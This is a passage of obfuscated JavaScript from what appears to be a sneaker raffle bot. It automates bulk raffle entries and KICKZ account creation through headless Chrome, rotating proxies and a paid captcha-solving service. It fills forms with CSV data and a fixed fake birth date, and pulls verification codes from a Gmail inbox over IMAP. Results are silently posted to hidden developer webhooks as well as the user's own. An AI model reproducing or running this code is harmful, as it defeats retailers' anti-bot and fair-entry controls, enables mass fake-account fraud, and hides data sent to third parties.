                    _0x73a448(_0x3ac31f['name'] + '\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20/\x20' + _0x51a35f['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                    try {
                        await _0x5c0aeb(_0x51a35f, _0x5cb42a);
                    } catch {
                        _0x123a18 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x4bfac9 = await _0x22ebf6(_0x51a35f[_0x5cb42a], _0x3ac31f, 'dev', ![]), _0x5a429d = await _0x22ebf6(_0x51a35f[_0x5cb42a], _0x3ac31f, 'pub', ![]);
                    const _0x4a6a74 = {
                        'succesDEVMSG': { 'embeds': [_0x4bfac9] },
                        'succesPUBMSG': { 'embeds': [_0x5a429d] }
                    };
                    if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                        try {
                            await _0x1cac9f(_0x263298['webhook'], _0x4a6a74['succesDEVMSG']);
                        } catch {
                        }
                    await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x4a6a74['succesDEVMSG']), await _0x9175f4(0xc8);
                    try {
                        await _0x1cac9f(_0x2f03c2, _0x4a6a74['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x51a35f[_0x5cb42a]['Email'] == '' || _0x51a35f[_0x5cb42a]['Url'] == '' || _0x51a35f[_0x5cb42a]['FirstName'] == '' || _0x51a35f[_0x5cb42a]['LastName'] == '') {
                        console['log'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x263298['useRandomProxy'] = ![])
                        var _0x2b5692 = _0x39ab95[_0x5cb42a]['split'](':');
                    else
                        var _0x105059 = Math['round'](Math['random']() * (_0x39ab95['length'] - 0x1)), _0x2b5692 = _0x39ab95[_0x105059]['split'](':');
                    var _0x566d58;
                    try {
                        _0x566d58 = await _0x45f1d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2b5692[0x0] + ':' + _0x2b5692[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x566d58 = await _0x45f1d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2b5692[0x0] + ':' + _0x2b5692[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x16a9b0 = await _0x566d58['newPage']();
                        await _0x16a9b0['authenticate']({
                            'username': '' + _0x2b5692[0x2],
                            'password': '' + _0x2b5692[0x3]
                        }), console['log'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x16a9b0['setRequestInterception'](!![]), _0x16a9b0['on']('request', _0x57dd9a => {
                            _0x57dd9a['resourceType']() === 'image' || _0x57dd9a['resourceType']() === 'font' || _0x57dd9a['resourceType']() === 'media' ? _0x57dd9a['abort']() : _0x57dd9a['continue']();
                        });
                        try {
                            await _0x16a9b0['goto']('' + _0x51a35f[_0x5cb42a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x16a9b0['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x16a9b0['type']('#comp_firstname', '' + _0x51a35f[_0x5cb42a]['FirstName']), await _0x16a9b0['waitForSelector']('#comp_lastname'), await _0x16a9b0['type']('#comp_lastname', '' + _0x51a35f[_0x5cb42a]['LastName']), await _0x16a9b0['waitForSelector']('#comp_email'), await _0x16a9b0['type']('#comp_email', '' + _0x51a35f[_0x5cb42a]['Email']), await _0x16a9b0['waitForSelector']('#comp_paypalemail'), await _0x16a9b0['type']('#comp_paypalemail', '' + _0x51a35f[_0x5cb42a]['Email']), await _0x16a9b0['waitForSelector']('#comp_mobile_end'), await _0x16a9b0['type']('#comp_mobile_end', '' + _0x51a35f[_0x5cb42a]['Phone']), await _0x16a9b0['waitForSelector']('#comp_dob'), await _0x16a9b0['type']('#comp_dob', '08/09/1992'), console['log'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x51a35f[_0x5cb42a]['Size'] == 'RANDOM') {
                            const _0x13681d = await _0x16a9b0['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x38c60b => {
                                return _0x38c60b['map'](_0x912449 => _0x912449['value']);
                            });
                            var _0x375e4b = Math['round'](Math['random']() * (_0x13681d['length'] - 0x2));
                            await _0x16a9b0['select']('#shoesize', _0x13681d[_0x375e4b + 0x1]), await _0x9175f4(0x3e8);
                        } else {
                            const _0x4bbe5d = await _0x16a9b0['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x286ccb => {
                                return _0x286ccb['map'](_0x178145 => _0x178145['innerText']);
                            }), _0xe9cec8 = await _0x16a9b0['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5d8b96 => {
                                return _0x5d8b96['map'](_0x4dfd17 => _0x4dfd17['value']);
                            });
                            var _0x1d598b = _0x51a35f[_0x5cb42a]['Size'];
                            for (var _0x225b25 = 0x1; _0x225b25 < _0xe9cec8['length']; _0x225b25++) {
                                var _0xa896e1 = _0x4bbe5d[_0x225b25]['split']('\x20')[0x0];
                                if (_0xa896e1 == _0x1d598b) {
                                    await _0x16a9b0['select']('#shoesize', _0xe9cec8[_0x225b25]);
                                    break;
                                } else {
                                    if (_0x225b25 + 0x1 == _0xe9cec8['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x16a9b0['waitForSelector']('#comp_address1'), await _0x16a9b0['type']('#comp_address1', _0x51a35f[_0x5cb42a]['Address1'] + '\x20' + _0x51a35f[_0x5cb42a]['HouseNumber']), await _0x16a9b0['waitForSelector']('#comp_address2'), await _0x16a9b0['type']('#comp_address2', '' + _0x51a35f[_0x5cb42a]['Address2']), await _0x16a9b0['waitForSelector']('#comp_address2'), await _0x16a9b0['type']('#comp_address3', '' + _0x51a35f[_0x5cb42a]['City']), await _0x16a9b0['waitForSelector']('#comp_postcode'), await _0x16a9b0['type']('#comp_postcode', '' + _0x51a35f[_0x5cb42a]['Zip']), console['log'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x9175f4(0x4b0), await _0x16a9b0['click']('label#emailhold'), await _0x9175f4(0x5dc), await _0x16a9b0['click']('#preauth_tandc_email\x20>\x20label'), await _0x9175f4(0x5dc), await _0x16a9b0['click']('#submit');
                        try {
                            await _0x16a9b0['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20' + _0x561058['blue']('Awaiting\x20Paypal\x20Payment')), _0x566d58['on']('targetcreated', async _0x1432f4 => {
                            if (_0x1432f4['type']() === 'page') {
                                const _0x3e1d35 = await _0x1432f4['page']();
                                async function _0x5ccdaf() {
                                    try {
                                        await _0x16a9b0['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x1604ef = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x135457() {
                                    try {
                                        await _0x16a9b0['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x1ddfd6 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x135457(), _0x5ccdaf(), await _0x9175f4(0x493e0);
                            }
                        });
                        async function _0x22174a() {
                            for (let _0x21aee8 = 0x0; _0x21aee8 < 0x12c; _0x21aee8++) {
                                if (_0x1ddfd6 == !![]) {
                                    _0x123a18 = 'no', _0x3e2f6d(_0x51a35f[_0x5cb42a], _0x3ac31f), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                                        try {
                                            await _0x1cac9f(_0x263298['webhook'], _0x4a6a74['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x4a6a74['succesDEVMSG']), await _0x9175f4(0xc8);
                                    try {
                                        await _0x1cac9f(_0x2f03c2, _0x4a6a74['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x1604ef)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x9175f4(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x9175f4(0xbb8), await _0x16a9b0['click']('.zoid-outlet'), await _0x9175f4(0x7d0), await _0x22174a();
                    } catch (_0x4ce3a3) {
                        console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20' + _0x4ce3a3)), _0x17b796 = '' + _0x4ce3a3;
                        var _0x25c227 = await _0x22ebf6(_0x51a35f[_0x5cb42a], _0x3ac31f, 'dev', !![], _0x17b796);
                        _0x4a6a74['errorDEV'] = { 'embeds': [_0x25c227] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x4a6a74['errorDEV']), await _0x1cac9f(_0x569bf6, _0x4a6a74['errorDEV']);
                    } finally {
                        _0x566d58 && _0x566d58['close']();
                        if (_0x123a18 == 'yes' && _0x13de2b != 0x5 && _0x17b796 != 'Size\x20Not\x20Found') {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x3ac31f['name'] + ']\x20Task\x20' + (_0x5cb42a + 0x1) + '\x20:\x20Retrying\x20(' + _0x13de2b + '\x20/\x205)')), _0x5cb42a = _0x5cb42a - 0x1, _0x13de2b = _0x13de2b + 0x1;
                            continue;
                        }
                        _0x123a18 == 'yes' && _0x13de2b >= 0x5 && (_0x194f3c(afew[_0x5cb42a], _0x3ac31f), _0x123a18 = 'no', _0x13de2b = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0xce1b6e, _0x402920, _0x683562) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x6f721f = 0x0; _0x6f721f < _0x402920['length']; _0x6f721f++) {
                        const _0x267179 = 'https://www.kickz.com/login';
                        if (_0xe9102 != 'yes')
                            var _0xe9102 = '', _0x12bc51 = 0x0;
                        _0x73a448(_0xce1b6e['name'] + '\x20Task\x20' + (_0x6f721f + 0x1) + '\x20/\x20' + _0x402920['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        try {
                            await _0x5c0aeb(_0x402920, _0x6f721f);
                        } catch {
                            _0xe9102 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x42b9d0 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x100f6f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x263298['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ab5b1
                                }
                            ]
                        }];
                        const _0x3950d9 = { 'embeds': _0x42b9d0 };
                        var _0xdfee5f = await _0x22ebf6(_0x402920[_0x6f721f], _0xce1b6e, 'acc', ![]);
                        const _0xbc00e2 = { 'succesDEVMSG': { 'embeds': [_0xdfee5f] } };
                        if (_0x402920[_0x6f721f]['Email'] == '' || _0x402920[_0x6f721f]['FirstName'] == '' || _0x402920[_0x6f721f]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x402920[_0x6f721f]['Password'] == '' && (_0x402920[_0x6f721f]['Password'] = 'JRaffles23!');
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x28f28c = _0x683562[_0x6f721f]['split'](':');
                        else
                            var _0x33dc1e = Math['round'](Math['random']() * (_0x683562['length'] - 0x1)), _0x28f28c = _0x683562[_0x33dc1e]['split'](':');
                        var _0x1cea87;
                        try {
                            _0x1cea87 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28f28c[0x0] + ':' + _0x28f28c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1cea87 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28f28c[0x0] + ':' + _0x28f28c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x163cb2 = await _0x1cea87['newPage']();
                            await _0x163cb2['authenticate']({
                                'username': '' + _0x28f28c[0x2],
                                'password': '' + _0x28f28c[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x163cb2['setRequestInterception'](!![]), _0x163cb2['on']('request', _0x1ca646 => {
                                _0x1ca646['resourceType']() === 'image' || _0x1ca646['resourceType']() === 'font' || _0x1ca646['resourceType']() === 'media' ? _0x1ca646['abort']() : _0x1ca646['continue']();
                            }), await _0x163cb2['goto'](_0x267179), await _0x9175f4(0xbb8), console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x163cb2['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x163cb2['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x163cb2['waitForSelector']('#button-register'), await _0x9175f4(0x7d0), await _0x163cb2['evaluate'](() => {
                                const _0x5cd44d = document['querySelector']('#button-register');
                                _0x5cd44d['click']();
                            }), console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x9175f4(0x1388), await _0x163cb2['waitForSelector']('#customer_salutation'), await _0x163cb2['select']('#customer_salutation', 'mr'), await _0x9175f4(0x7d0), await _0x163cb2['waitForSelector']('#customer_firstname'), await _0x163cb2['type']('#customer_firstname', '' + _0x402920[_0x6f721f]['FirstName']), await _0x9175f4(0x352), await _0x163cb2['waitForSelector']('#customer_lastname'), await _0x163cb2['type']('#customer_lastname', '' + _0x402920[_0x6f721f]['LastName']), await _0x9175f4(0x352), await _0x163cb2['type']('#email-input', '' + _0x402920[_0x6f721f]['Email']), await _0x9175f4(0x352), await _0x163cb2['type']('#email-confirm-input', '' + _0x402920[_0x6f721f]['Email']), await _0x9175f4(0x352), await _0x163cb2['type']('#register-password', '' + _0x402920[_0x6f721f]['Password']), await _0x9175f4(0x352), await _0x163cb2['type']('#password-confirm', '' + _0x402920[_0x6f721f]['Password']), await _0x9175f4(0x352), console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x163cb2['click']('#consent'), await _0x9175f4(0x1f4);
                            const _0x420221 = await _0x163cb2['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x420221) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x163cb2['click']('#buttonRegister');
                            try {
                                await _0x163cb2['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x402920[_0x6f721f]['Email']), await _0x9175f4(0x4b0);
                            async function _0x4315d8() {
                                var _0x44b0ae, _0x34e74c = ![];
                                for (var _0x42fc89 = 0x0; _0x42fc89 < 0x18; _0x42fc89++) {
                                    async function _0x2d730f() {
                                        var _0x6bfc28 = new _0x518654({
                                            'user': _0x263298['masterMail'],
                                            'password': _0x263298['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x42b7dd(_0x363b98) {
                                            _0x6bfc28['openBox']('INBOX', ![], _0x363b98);
                                        }
                                        _0x6bfc28['once']('ready', function () {
                                            console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x42b7dd(function (_0x55c6b3, _0x47eb0b) {
                                                console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x55c6b3)
                                                    throw _0x55c6b3;
                                                _0x6bfc28['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x2c58c9, _0x2ac75e) {
                                                    if (!_0x2ac75e || !_0x2ac75e['length'])
                                                        console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x6bfc28['end']();
                                                    else {
                                                        var _0x2e493f = _0x6bfc28['seq']['fetch'](_0x2ac75e, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x2e493f['on']('message', function (_0x142f65, _0x3e9f3e) {
                                                            var _0xc0e1e0 = '(#' + _0x3e9f3e + ')\x20';
                                                            _0x142f65['on']('body', function (_0x35e227, _0x36165c) {
                                                                _0x504fd9(_0x35e227, (_0x3fd11a, _0x5bda11) => {
                                                                    if (_0x5bda11['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x1ce5a4 = _0x5bda11['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x465138 = _0x1ce5a4[0x1]['split']('<')[0x0];
                                                                        _0x44b0ae = _0x465138;
                                                                    }
                                                                });
                                                            }), _0x142f65['once']('end', function () {
                                                            });
                                                        }), _0x2e493f['once']('error', function (_0x45d1f1) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x2e493f['once']('end', function () {
                                                            _0x6bfc28['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x6bfc28['once']('error', function (_0x4168b3) {
                                            console['log'](_0x561058['red'](_0x4168b3['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x34e74c = !![];
                                        }), _0x6bfc28['once']('end', async function () {
                                        }), _0x6bfc28['connect']();
                                    }
                                    _0x2d730f(), await _0x9175f4(0x1388);
                                    if (_0x44b0ae)
                                        return _0x44b0ae;
                                    if (_0x34e74c)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x42fc89 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4315d8(), _0x9175f4(0x320), console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Verifying..'), await _0x163cb2['type']('#verificationCode', code), await _0x9175f4(0x1f4), await _0x163cb2['click']('#buttonVerify'), await _0x9175f4(0x190), await _0x163cb2['click']('#buttonVerify'), await _0x9175f4(0x3e8);
                            try {
                                await _0x163cb2['waitForSelector']('div.b-user_greeting'), _0xe9102 = 'no', console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Account\x20' + _0x402920[_0x6f721f]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x1ed524['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x402920[_0x6f721f]['Email'] + ',' + _0x402920[_0x6f721f]['Password'] + ','), console['log'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Account\x20' + _0x402920[_0x6f721f]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0xbc00e2['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1cac9f(_0x515b29, _0xbc00e2['succesDEVMSG']);
                            } catch {
                                _0xe9102 = 'no', console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x190764) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20' + _0x190764)), _0x42b9d0[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x42b9d0[0x0]['description'] = '' + _0x190764, await _0x1cac9f(_0x569bf6, _0x3950d9), _0xe9102 = 'yes';
                        } finally {
                            _0x1cea87 && _0x1cea87['close']();
                            if (_0xe9102 == 'yes' && _0x12bc51 != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0xce1b6e['name'] + ']\x20Task\x20' + (_0x6f721f + 0x1) + '\x20:\x20Retrying\x20(' + _0x12bc51 + '\x20/\x205)')), _0x6f721f = _0x6f721f - 0x1, _0x12bc51 = _0x12bc51 + 0x1;
                                continue;
                            }
                            _0xe9102 == 'yes' && _0x12bc51 >= 0x5 && (_0x194f3c(_0x402920[_0x6f721f], _0xce1b6e), _0xe9102 = 'no', _0x12bc51 = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1d2ef5, _0x544636, _0x3ad7c9) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x8fb55a = 0x0; _0x8fb55a < _0x544636['length']; _0x8fb55a++) {
                        var _0x6467f1;
                        if (_0x3cf3f7 != 'yes')
                            var _0x3cf3f7 = '', _0x557335 = 0x0;
                        _0x73a448(_0x1d2ef5['name'] + '\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20/\x20' + _0x544636['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        var _0x5e5c37 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x100f6f
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x544636[_0x8fb55a]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x544636[_0x8fb55a]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x263298['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ab5b1
                                }
                            ]
                        }], _0x42af66 = await _0x22ebf6(_0x544636[_0x8fb55a], _0x1d2ef5, 'dev', ![]), _0x27c616 = await _0x22ebf6(_0x544636[_0x8fb55a], _0x1d2ef5, 'pub', ![]);
                        const _0x5a6e18 = {
                            'succesDEVMSG': { 'embeds': [_0x42af66] },
                            'succesPUBMSG': { 'embeds': [_0x27c616] }
                        };
                        try {
                            await _0x5c0aeb(_0x544636, _0x8fb55a);
                        } catch {
                            _0x3cf3f7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x544636[_0x8fb55a]['Email'] == '' || _0x544636[_0x8fb55a]['Password'] == '' || _0x544636[_0x8fb55a]['FirstName'] == '' || _0x544636[_0x8fb55a]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x543c3f = _0x3ad7c9[_0x8fb55a]['split'](':');
                        else
                            var _0x1bb709 = Math['round'](Math['random']() * (_0x3ad7c9['length'] - 0x1)), _0x543c3f = _0x3ad7c9[_0x1bb709]['split'](':');
                        var _0xcc66fc;
                        try {
                            _0xcc66fc = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x543c3f[0x0] + ':' + _0x543c3f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xcc66fc = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x543c3f[0x0] + ':' + _0x543c3f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x363ec3 = await _0xcc66fc['newPage']();
                            await _0x363ec3['authenticate']({
                                'username': '' + _0x543c3f[0x2],
                                'password': '' + _0x543c3f[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x363ec3['setRequestInterception'](!![]), _0x363ec3['on']('request', _0x29458d => {
                                _0x29458d['resourceType']() === 'image' || _0x29458d['resourceType']() === 'font' || _0x29458d['resourceType']() === 'media' ? _0x29458d['abort']() : _0x29458d['continue']();
                            }), await _0x363ec3['goto']('' + _0x544636[_0x8fb55a]['Url'], { 'waitUntil': 'networkidle2' }), await _0x9175f4(0x12c), await _0x363ec3['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x363ec3['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x9175f4(0x7d0);
                            try {
                                await _0x363ec3['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x363ec3['click']('a[title=\x22sign\x20in\x22]');
                            }
